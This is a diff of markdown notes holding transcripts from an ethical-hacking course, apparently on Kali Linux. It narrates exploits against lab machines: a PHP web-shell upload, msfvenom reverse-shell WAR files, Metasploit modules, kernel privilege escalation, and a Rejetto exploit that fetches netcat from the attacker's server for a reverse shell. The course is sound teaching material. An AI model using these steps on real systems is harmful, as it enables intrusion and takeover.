 > **[3:04](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-proftpd?u=76281980&t=184)** Let's go in with user.
 >
@@ -2081,7 +2056,7 @@ created: 2026-05-02
 >
 > **[3:26](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-proftpd?u=76281980&t=206)** LS slash var slash www.
 >
-> **[3:32](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-proftpd?u=76281980&t=212)** Okay, and let's see if we can write into it with our shelly implant Put shelly dot php to slash var slash www slash shelly dot php.
+> **[3:32](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-proftpd?u=76281980&t=212)** Okay, and let's see if we can write into it with our shelly implant Put shelly dot [[PHP]] to slash var slash www slash shelly dot php.
 >
 > **[3:47](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-with-proftpd?u=76281980&t=227)** And we get permission denied.
 >
@@ -2107,7 +2082,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[PHP]] (5), [[PostgreSQL|Postgres]] (2), [[Microsoft Word|Word]] (1), web (1), data (1)
+> **Frameworks & Libraries:** [[PHP]] (5), [[Metasploit]] (2), [[PostgreSQL|Postgres]] (2), [[Metasploit|Msf]] (1), [[Microsoft Word|Word]] (1)
 > **Env Vars:** ftp (7), p2121 (1), msf (1), lvnp (1)
 > **CLI Commands:** php (5), ls (1)
 > **Versions:** 1.3.1 (2)
@@ -2115,8 +2090,7 @@ created: 2026-05-02
 > **Prerequisites:** set up (1)
 > **Speakers:** - [narrator] (1)
 
-#### Exploiting Tomcat
-> [LinkedIn Learning](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-tomcat?u=76281980)
+#### [Exploiting Tomcat](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-tomcat?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -2140,9 +2114,9 @@ created: 2026-05-02
 >
 > **[1:12](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-tomcat?u=76281980&t=72)** Controlling the web service fine, but we really want to control the total system.
 >
-> **[1:17](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-tomcat?u=76281980&t=77)** Kali provides us with a means of creating war files using msfvenom.
+> **[1:17](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-tomcat?u=76281980&t=77)** Kali provides us with a means of creating war files using [[Metasploit|msfvenom]].
 >
-> **[1:22](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-tomcat?u=76281980&t=82)** And this will create a Java application in a war file.
+> **[1:22](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-tomcat?u=76281980&t=82)** And this will create a [[Java]] application in a war file.
 >
 > **[1:26](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-tomcat?u=76281980&t=86)** So let's create one which delivers a command shell.
 >
@@ -2172,7 +2146,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** application (2), web (2), [[Java]] (2)
+> **Frameworks & Libraries:** [[Metasploit|Msfvenom]] (2), [[Java]] (2)
 > **Env Vars:** lhost (1), lport (1), url (1)
 > **Ports:** port 8180 (1), :8180 (1)
 > **Versions:** 10.0.2 (2)
@@ -2181,16 +2155,15 @@ created: 2026-05-02
 > **Cross-References:** go back to (1)
 > **UI Navigation:** open the (1)
 
-#### Exploiting IRC
-> [LinkedIn Learning](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-irc?u=76281980)
+#### [Exploiting IRC](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-irc?u=76281980)
 
 > [!transcript]- Transcript
 >
-> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-irc?u=76281980&t=0)** - [Instructor] Let's take a look at the IRC service on port 6667 our metasploitable server, nmap -PS -sV -p6667 10.0.2.8.
+> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-irc?u=76281980&t=0)** - [Instructor] Let's take a look at the IRC service on port 6667 our metasploitable server, [[Nmap]] -PS -sV -p6667 10.0.2.8.
 >
 > **[0:16](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-irc?u=76281980&t=16)** We can see it's an Unreal IRCd service.
 >
-> **[0:20](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-irc?u=76281980&t=20)** Let's see what metasploit has for us.
+> **[0:20](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-irc?u=76281980&t=20)** Let's see what [[Metasploit]] has for us.
 >
 > **[0:26](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-irc?u=76281980&t=26)** We'll search for unreal, and we can see we've got an exploit for unreal IRCd 3.2.8.1.
 >
@@ -2208,15 +2181,14 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Search]] (1)
+> **Frameworks & Libraries:** [[Nmap]] (1), [[Metasploit]] (1)
 > **Versions:** 10.0.2 (3), 3.2.8 (1)
 > **Code Identifiers:** sv (1)
 > **Ports:** port 6667 (1)
 > **Env Vars:** irc (1)
 > **Speakers:** - [instructor] (1)
 
-#### Exploiting the distributed compile system
-> [LinkedIn Learning](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-the-distributed-compile-system?u=76281980)
+#### [Exploiting the distributed compile system](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-the-distributed-compile-system?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -2232,9 +2204,9 @@ created: 2026-05-02
 >
 > **[0:32](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-the-distributed-compile-system?u=76281980&t=32)** Let's check what searchsploit has for us, searchsploit distcc.
 >
-> **[0:40](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-the-distributed-compile-system?u=76281980&t=40)** And we find there's a command execution in Metasploit for this cc.
+> **[0:40](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-the-distributed-compile-system?u=76281980&t=40)** And we find there's a command execution in [[Metasploit]] for this cc.
 >
-> **[0:45](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-the-distributed-compile-system?u=76281980&t=45)** Msfconsole and we'll search again for distcc
+> **[0:45](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-the-distributed-compile-system?u=76281980&t=45)** [[Metasploit|Msfconsole]] and we'll search again for distcc
 >
 > **[0:54](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-the-distributed-compile-system?u=76281980&t=54)** and we find it we'll use zero and we'll set our remote host to 10.0.2.8.
 >
@@ -2248,21 +2220,20 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Search]] (1)
+> **Frameworks & Libraries:** [[Metasploit]] (1), [[Metasploit|Msfconsole]] (1)
 > **CLI Commands:** find (5)
 > **Versions:** 10.0.2 (2)
 > **Code Identifiers:** sv (1)
 > **Ports:** port 3632 (1)
 > **Speakers:** - [instructor] (1)
 
-#### Exploiting network files
-> [LinkedIn Learning](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-network-files?u=76281980)
+#### [Exploiting network files](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-network-files?u=76281980)
 
 > [!transcript]- Transcript
 >
 > **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-network-files?u=76281980&t=0)** - [Instructor] Let's take a look at port 2049 on our Metasploitable host.
 >
-> **[0:05](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-network-files?u=76281980&t=5)** Nmap -PS -sV -p2049 10.0.2.8
+> **[0:05](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-network-files?u=76281980&t=5)** [[Nmap]] -PS -sV -p2049 10.0.2.8
 >
 > **[0:16](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-network-files?u=76281980&t=16)** Okay, we have the NFS service running.
 >
@@ -2304,6 +2275,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
+> **Frameworks & Libraries:** [[Nmap]] (1)
 > **CLI Commands:** ssh (7), sudo (2), mkdir (1), make (1), cat (1)
 > **Env Vars:** ssh (3), nfs (2)
 > **Versions:** 10.0.2 (4)
@@ -2312,14 +2284,13 @@ created: 2026-05-02
 > **UI Navigation:** switch to (1)
 > **Speakers:** - [instructor] (1)
 
-#### Hiding in plain sight
-> [LinkedIn Learning](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/hiding-in-plain-sight?u=76281980)
+#### [Hiding in plain sight](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/hiding-in-plain-sight?u=76281980)
 
 > [!transcript]- Transcript
 >
 > **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/hiding-in-plain-sight?u=76281980&t=0)** - [Instructor] Let's take a look at Port 1524 on Metasploitable.
 >
-> **[0:04](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/hiding-in-plain-sight?u=76281980&t=4)** nmap -PS -sV
+> **[0:04](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/hiding-in-plain-sight?u=76281980&t=4)** [[Nmap]] -PS -sV
 >
 > **[0:08](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/hiding-in-plain-sight?u=76281980&t=8)** - p1524 10.0.2.8, and it's reported there's a Metasploitable root shell.
 >
@@ -2335,14 +2306,14 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
+> **Frameworks & Libraries:** [[Nmap]] (1)
 > **Versions:** 10.0.2 (2)
 > **Speakers:** - [instructor] (1), - p1524 (1)
 > **Code Identifiers:** sv (1)
 > **Ports:** port 1524 (1)
 > **Prerequisites:** set up (1)
 
-#### Escalating to root
-> [LinkedIn Learning](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/escalating-to-root?u=76281980)
+#### [Escalating to root](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/escalating-to-root?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -2352,7 +2323,7 @@ created: 2026-05-02
 >
 > **[0:08](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/escalating-to-root?u=76281980&t=8)** Let's look at how we escalate privileges.
 >
-> **[0:11](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/escalating-to-root?u=76281980&t=11)** First of all, let's go back to one of our user shells that we got with the shelly.php implant, which we uploaded using ProFTPD.
+> **[0:11](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/escalating-to-root?u=76281980&t=11)** First of all, let's go back to one of our user shells that we got with the shelly.[[PHP]] implant, which we uploaded using ProFTPD.
 >
 > **[0:19](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/escalating-to-root?u=76281980&t=19)** We still have the PHP file loaded into Metasploitable.
 >
@@ -2366,7 +2337,7 @@ created: 2026-05-02
 >
 > **[0:44](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/escalating-to-root?u=76281980&t=44)** Uname -a, lsb_release -a.
 >
-> **[0:53](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/escalating-to-root?u=76281980&t=53)** We can see we're Linux Kernel 2.6.24 and we're running Ubuntu 8.04.
+> **[0:53](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/escalating-to-root?u=76281980&t=53)** We can see we're [[Linux]] Kernel 2.6.24 and we're running [[Ubuntu]] 8.04.
 >
 > **[1:02](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/escalating-to-root?u=76281980&t=62)** Let's see what the Ubuntu exploits there are for a Linux Kernel with 2.6 in its version using Searchsploit.
 >
@@ -2380,7 +2351,7 @@ created: 2026-05-02
 >
 > **[1:29](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/escalating-to-root?u=76281980&t=89)** We'll copy it locally, just for the moment.
 >
-> **[1:31](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/escalating-to-root?u=76281980&t=91)** user/share/exploitdb/exploits
+> **[1:31](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/escalating-to-root?u=76281980&t=91)** user/share/[[Exploit-DB|exploitdb]]/exploits
 >
 > **[1:41](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/escalating-to-root?u=76281980&t=101)** and it's a Linux/local called 8572.c, and we'll copy it to where we are.
 >
@@ -2400,7 +2371,7 @@ created: 2026-05-02
 >
 > **[2:36](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/escalating-to-root?u=76281980&t=156)** and we'll execute bin/bash.
 >
-> **[2:40](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/escalating-to-root?u=76281980&t=160)** Okay, let's copy 8572.c and run into the temp folder on the target using netcat.
+> **[2:40](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/escalating-to-root?u=76281980&t=160)** Okay, let's copy 8572.c and run into the temp folder on the target using [[Netcat]].
 >
 > **[2:49](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/escalating-to-root?u=76281980&t=169)** We go back to our shell, let's cd into temp, which is writeable, and we'll netcut -lvnp 1111, and we'll write in here 8572.c.
 >
@@ -2440,7 +2411,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Linux]] (4), [[Ubuntu]] (3), [[PHP]] (2), cd (1)
+> **Frameworks & Libraries:** [[Linux]] (4), [[Ubuntu]] (3), [[PHP]] (2), [[Exploit-DB|Exploitdb]] (1), [[Netcat]] (1)
 > **File Paths:** 8572.c (5), shelly.php (1)
 > **CLI Commands:** php (2), make (2), cd (1), cat (1)
 > **Versions:** 2.6 (2), 2.6.24 (1), 8.04 (1), 10.2.18 (1), 10.2.8 (1)
@@ -2454,8 +2425,7 @@ created: 2026-05-02
 
 [↑ Back to Table of Contents](#table-of-contents)
 
-#### Starting with online labs
-> [LinkedIn Learning](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/starting-with-online-labs?u=76281980)
+#### [Starting with online labs](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/starting-with-online-labs?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -2465,7 +2435,7 @@ created: 2026-05-02
 >
 > **[0:17](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/starting-with-online-labs?u=76281980&t=17)** You need to keep up to date, and that means continuing to exercise your skills.
 >
-> **[0:23](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/starting-with-online-labs?u=76281980&t=23)** Earlier in the course, we introduced the Hack The Box and Defensive Security Online Penetration Testing Labs, which provide a range of systems to exploit with both local and route tokens to claim.
+> **[0:23](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/starting-with-online-labs?u=76281980&t=23)** Earlier in the course, we introduced the Hack The Box and Defensive Security Online [[Penetration Testing]] Labs, which provide a range of systems to exploit with both local and route [[Tokens]] to claim.
 >
 > **[0:35](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/starting-with-online-labs?u=76281980&t=35)** If you don't already have accounts on these labs you can sign up at the main sign in pages.
 >
@@ -2479,7 +2449,7 @@ created: 2026-05-02
 >
 > **[1:17](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/starting-with-online-labs?u=76281980&t=77)** Let's see how we're getting that.
 >
-> **[1:18](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/starting-with-online-labs?u=76281980&t=78)** We logged into Hack The Box, so let's select connect to HTB at the top right.
+> **[1:18](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/starting-with-online-labs?u=76281980&t=78)** We logged into Hack The Box, so let's select connect to [[HackTheBox|HTB]] at the top right.
 >
 > **[1:27](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/starting-with-online-labs?u=76281980&t=87)** We're currently offline and we have a number of lab options.
 >
@@ -2513,7 +2483,7 @@ created: 2026-05-02
 >
 > **[3:18](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/starting-with-online-labs?u=76281980&t=198)** Let's go look at the system.
 >
-> **[3:20](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/starting-with-online-labs?u=76281980&t=200)** And we can nmap -PS -sv 10.129.10.86
+> **[3:20](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/starting-with-online-labs?u=76281980&t=200)** And we can [[Nmap]] -PS -sv 10.129.10.86
 >
 > **[3:46](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/starting-with-online-labs?u=76281980&t=226)** Okay, we can see we have telnet open.
 >
@@ -2551,7 +2521,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Security]] (5), vpn (3), [[Penetration Testing]] (1), [[Tokens]] (1), web (1)
+> **Frameworks & Libraries:** [[Nmap]] (2), [[Penetration Testing]] (1), [[Tokens]] (1), [[HackTheBox|Htb]] (1)
 > **Env Vars:** vip (3), vpn (3), htb (1)
 > **Versions:** 10.129.10 (2), 192.168.156 (1)
 > **CLI Commands:** sudo (2)
@@ -2559,18 +2529,17 @@ created: 2026-05-02
 > **Cross-References:** earlier in (1)
 > **Speakers:** - [instructor] (1)
 
-#### Exploiting rejetto
-> [LinkedIn Learning](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980)
+#### [Exploiting rejetto](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980)
 
 > [!transcript]- Transcript
 >
-> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980&t=0)** - [Instructor] I'm VPN'd into our LinkedIn Learning Lab, and on the lab, we can find a target with IP address 10.10.10.8.
+> **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980&t=0)** - [Instructor] I'm VPN'd into our [[LinkedIn]] Learning Lab, and on the lab, we can find a target with IP address 10.10.10.8.
 >
-> **[0:08](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980&t=8)** Let's run a port enumeration using nmap to get a sense of what we're targeting.
+> **[0:08](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980&t=8)** Let's run a port enumeration using [[Nmap]] to get a sense of what we're targeting.
 >
 > **[0:14](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980&t=14)** nmap -PS
 >
-> **[0:15](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980&t=15)** - sV 10.10.10.8, okay, we have a Windows host with only Port 80 open and running an HTTP file server.
+> **[0:15](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980&t=15)** - sV 10.10.10.8, okay, we have a [[Windows]] host with only Port 80 open and running an HTTP file server.
 >
 > **[0:28](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980&t=28)** Let's see what's there.
 >
@@ -2582,11 +2551,11 @@ created: 2026-05-02
 >
 > **[0:52](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980&t=52)** Okay, we got a number of options here.
 >
-> **[0:54](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980&t=54)** There's a Ruby exploit, so likely a Metasploit option, but let's do this one natively.
+> **[0:54](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980&t=54)** There's a Ruby exploit, so likely a [[Metasploit]] option, but let's do this one natively.
 >
 > **[0:59](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980&t=59)** We'll have a look at 39161.py.
 >
-> **[1:03](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980&t=63)** We'll copy /usr/share/exploitdb/
+> **[1:03](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980&t=63)** We'll copy /usr/share/[[Exploit-DB|exploitdb]]/
 >
 > **[1:12](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980&t=72)** exploits/windows/remote/39161.py,
 >
@@ -2596,7 +2565,7 @@ created: 2026-05-02
 >
 > **[1:29](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980&t=89)** In the comments, we can see that we call the script with the IP address and the port of the target.
 >
-> **[1:35](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980&t=95)** And we see that netcat needs to be uploaded to the target.
+> **[1:35](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980&t=95)** And we see that [[Netcat]] needs to be uploaded to the target.
 >
 > **[1:39](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980&t=99)** We can see three functions defined, script.create, execute.script, and nc_run.
 >
@@ -2622,13 +2591,13 @@ created: 2026-05-02
 >
 > **[3:18](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980&t=198)** The exploit requires that I open a web server and that I have netcat present in my web root.
 >
-> **[3:24](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980&t=204)** Let's go to the web root, cd /var/www/html.
+> **[3:24](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980&t=204)** Let's go to the web root, cd /var/www/[[HTML]].
 >
 > **[3:31](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980&t=211)** Kali provides us with a copy of netcat for Windows, so I'll copy that in, sudo cp /usr/share/windows-binaries/nc.exe,
 >
 > **[3:48](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980&t=228)** and we'll copy the, okay.
 >
-> **[3:52](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980&t=232)** Finally, let's start a simple web session on Port 80, python -m SimpleHTTPServer on port 80.
+> **[3:52](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980&t=232)** Finally, let's start a simple web session on Port 80, [[Python (Programming Language)|python]] -m SimpleHTTPServer on port 80.
 >
 > **[4:07](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980&t=247)** Okay, I'll set up a reverse connection listener in a new terminal window, nc -lvmp 2222.
 >
@@ -2646,15 +2615,15 @@ created: 2026-05-02
 >
 > **[4:59](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980&t=299)** We can type user.txt.txt, and there's the token.
 >
-> **[5:06](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980&t=306)** And we can register that with hackthebox 2nr point.
+> **[5:06](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980&t=306)** And we can register that with [[HackTheBox]] 2nr point.
 >
 > **[5:10](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980&t=310)** Let's also get some details while we're here, whoami, we're on a server called optimum and we're operating under the kostas account.
 >
-> **[5:20](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980&t=320)** ver, running on Microsoft Windows 6.3.9600.
+> **[5:20](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980&t=320)** ver, running on [[Microsoft]] Windows 6.3.9600.
 >
 > **[5:26](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980&t=326)** And we can get more details with systeminfo.
 >
-> **[5:35](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980&t=335)** Okay, this is a Windows Server 2012 64-bit system, and we've also get a list of hotfixes that have been applied.
+> **[5:35](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980&t=335)** Okay, this is a [[Windows Server]] 2012 64-bit system, and we've also get a list of hotfixes that have been applied.
 >
 > **[5:47](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-rejetto?u=76281980&t=347)** And we can see there are three users, Administrator, kostas, and Public.
 >
@@ -2670,7 +2639,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Windows]] (5), web (5), [[Python (Programming Language)|Python]] (2), vpn (1), [[LinkedIn]] (1)
+> **Frameworks & Libraries:** [[Windows]] (5), [[Netcat]] (5), [[Nmap]] (2), [[Python (Programming Language)|Python]] (2), [[LinkedIn]] (1)
 > **CLI Commands:** python (2), find (1), ruby (1), make (1), cd (1)
 > **Env Vars:** url (3), xmlhttp (2), vpn (1), http (1)
 > **File Paths:** 39161.py (3), user.txt.txt (2), exploits/windows/remote/39161.py (1)
@@ -2679,20 +2648,19 @@ created: 2026-05-02
 > **Code Identifiers:** sv (1), nc_run (1)
 > **Definitions:** is a  (2)
 
-#### Exploiting the Devel
-> [LinkedIn Learning](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-the-devel?u=76281980)
+#### [Exploiting the Devel](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-the-devel?u=76281980)
 
 > [!transcript]- Transcript
 >
 > **[0:00](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-the-devel?u=76281980&t=0)** - [Instructor] The next Hack The Box target we'll look at is 10.10.10.5.
 >
-> **[0:04](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-the-devel?u=76281980&t=4)** Once again, the first thing we'll do is run nmap to find out what we're targeting.
+> **[0:04](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-the-devel?u=76281980&t=4)** Once again, the first thing we'll do is run [[Nmap]] to find out what we're targeting.
 >
 > **[0:10](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-the-devel?u=76281980&t=10)** Nmap 10.10.10.5
 >
 > **[0:15](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-the-devel?u=76281980&t=15)** - ps -sp.
 >
-> **[0:20](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-the-devel?u=76281980&t=20)** We have a Windows host with port 21 and port 80 open.
+> **[0:20](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-the-devel?u=76281980&t=20)** We have a [[Windows]] host with port 21 and port 80 open.
 >
 > **[0:24](https://www.linkedin.com/learning/kali-linux-for-advanced-pen-testing-and-ethical-hacking/exploiting-the-devel?u=76281980&t=24)** We don't have any firm indication yet of the operating system or host name.
 >
@@ -2706,7 +2674,7 @@ created: 2026-05-02
 >
